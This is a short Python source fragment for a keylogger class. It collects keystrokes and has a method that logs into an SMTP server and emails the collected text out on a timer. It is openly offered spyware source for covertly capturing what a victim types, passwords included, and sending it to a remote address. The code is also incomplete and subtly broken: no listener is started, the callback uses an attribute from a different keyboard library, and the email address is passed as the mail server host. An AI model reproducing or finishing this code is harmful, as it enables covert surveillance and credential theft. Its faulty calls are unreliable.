from pynput import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 # in seconds
EMAIL_ADRESS = ""
EMAIL_PASSWORD = ""

class Keylogger:
    def __init__(self, interval, report_method="mail"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        

    def callback_on_release(self, event):
        key = event.name 
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\n"
        elif key == "shift":
            key = ""
        self.log += key

    def sendmail(self, source_email, dest_email, port, password, message):
        server = smtplib.SMTP(source_email, port)
        server.starttls()
        server.login(source_email, password)
        server.sendmail(source_email, dest_email, message)
        server.quit()